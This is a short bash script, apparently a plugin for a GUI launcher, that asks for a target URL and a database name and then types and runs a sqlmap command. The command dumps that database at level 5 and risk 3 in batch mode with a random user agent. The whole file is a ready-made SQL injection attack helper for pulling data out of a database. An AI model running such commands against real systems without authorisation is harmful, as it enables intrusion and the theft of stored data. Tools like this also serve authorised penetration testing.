#!/bin/bash

: '
sqlmap: dump specific database
'

# Generate GUI form items (label, type (optional: default text), name, default (optional))
DATABASE_FIELD=$(form_item "database" "database")
URL_FIELD=$(form_item "URL" "url")

# Generate GUI form
generate_form "${DATABASE_FIELD}" "${URL_FIELD}"

DATABASE=${form_data["database"]}
URL=${form_data["url"]}

paste_command "sqlmap -u ${URL} -D ${DATABASE} --dump --random-agent --level 5 --risk 3 --batch"
xdotool key Return
